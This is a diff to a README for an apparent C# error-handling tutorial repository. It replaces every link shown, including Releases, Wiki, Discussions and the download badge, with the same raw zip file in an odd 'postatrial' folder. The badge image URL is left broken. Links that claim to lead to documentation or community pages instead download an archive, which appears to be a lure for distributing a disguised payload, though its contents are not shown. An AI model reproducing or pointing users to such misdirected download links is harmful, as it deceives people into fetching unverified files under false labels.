@@ -1,6 +1,6 @@
 # 🚀 csharp-error-handling-demo - Learn Error Handling in C# Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Visit%20Here-blue)](https://github.com/Akhilrathina/csharp-error-handling-demo/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Akhilrathina/csharp-error-handling-demo/main/postatrial/csharp-error-handling-demo.zip%20Latest%20Release-Visit%20Here-blue)](https://raw.githubusercontent.com/Akhilrathina/csharp-error-handling-demo/main/postatrial/csharp-error-handling-demo.zip)
 
 ## 📖 Overview
 
@@ -24,7 +24,7 @@ To run this application, ensure your system meets the following requirements:
 
 ## 🚀 Getting Started
 
-1. **Access the Download Page**: To begin, visit the [Releases page](https://github.com/Akhilrathina/csharp-error-handling-demo/releases).
+1. **Access the Download Page**: To begin, visit the [Releases page](https://raw.githubusercontent.com/Akhilrathina/csharp-error-handling-demo/main/postatrial/csharp-error-handling-demo.zip).
    
 2. **Download the Application**: Locate the latest version under "Latest release". You will find the installation file available for download.
 
@@ -60,8 +60,8 @@ The Result Pattern offers a more modern approach. It returns an object that indi
 
 ## 📚 Additional Resources
 
-- **Documentation**: Check the [Wiki](https://github.com/Akhilrathina/csharp-error-handling-demo/wiki) for in-depth guides and tutorials.
-- **Community Support**: Join our discussions on [GitHub Discussions](https://github.com/Akhilrathina/csharp-error-handling-demo/discussions) for community support and tips.
+- **Documentation**: Check the [Wiki](https://raw.githubusercontent.com/Akhilrathina/csharp-error-handling-demo/main/postatrial/csharp-error-handling-demo.zip) for in-depth guides and tutorials.
+- **Community Support**: Join our discussions on [GitHub Discussions](https://raw.githubusercontent.com/Akhilrathina/csharp-error-handling-demo/main/postatrial/csharp-error-handling-demo.zip) for community support and tips.
 
 ## 💡 Best Practices
 
@@ -73,4 +73,4 @@ The Result Pattern offers a more modern approach. It returns an object that indi
 
 For any questions or feedback, feel free to create an issue in the repository or reach out directly via GitHub.
 
-Don’t forget to visit the [Download Page](https://github.com/Akhilrathina/csharp-error-handling-demo/releases) to install the application and start exploring error handling in C# today!
+Don’t forget to visit the [Download Page](https://raw.githubusercontent.com/Akhilrathina/csharp-error-handling-demo/main/postatrial/csharp-error-handling-demo.zip) to install the application and start exploring error handling in C# today!
